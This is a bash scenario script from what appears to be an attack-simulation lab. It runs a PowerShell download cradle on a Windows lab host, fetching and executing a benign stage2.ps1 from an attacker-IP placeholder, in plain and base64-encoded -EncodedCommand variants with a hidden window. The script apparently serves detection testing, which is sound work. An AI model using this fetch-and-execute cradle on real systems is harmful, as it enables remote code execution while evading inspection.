#!/usr/bin/env bash
# S05 — Malicious PowerShell download cradle on Erebor.
# Params: VARIANT (odd=plain, even=encoded), SUCCEED (host reachable or not).
# Requires OpenSSH Server on Erebor (see runners/README.md). Barad-dûr serves
# stage2.ps1. See scenarios/S05-powershell-cradle.md.
run_scenario() {
  local HOST; [[ "$SUCCEED" == "yes" ]] && HOST="$ATTACKER_IP:$STAGE_HTTP_PORT" || HOST="10.10.10.199:$STAGE_HTTP_PORT"
  local STAGE_URL="http://$HOST/stage2.ps1"

  step "stage a benign stage2 on Barad-dûr"
  drop_stage_file "stage2.ps1" $'Write-Output "stage2 executed in lab"\n# benign lab second stage\n'
  serve_stage

  local INNER="IEX (New-Object Net.WebClient).DownloadString('$STAGE_URL')"

  if (( VARIANT % 2 == 1 )); then
    step "variant plain: download cradle"
    on_win "cradle-plain" "powershell -nop -w hidden -c \"$INNER\""
    note "plain cradle → $STAGE_URL (reachable: $SUCCEED)"
  else
    step "variant encoded: base64 -EncodedCommand cradle"
    # UTF-16LE base64 of INNER, built on Barad-dûr so the seal records the plaintext.
    local B64; B64=$(printf '%s' "$INNER" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo BASE64_BUILD_FAILED)
    note "encoded cradle, plaintext: $INNER"
    on_win "cradle-enc" "powershell -nop -w hidden -enc $B64"
  fi

  stop_stage
  noise_win
}
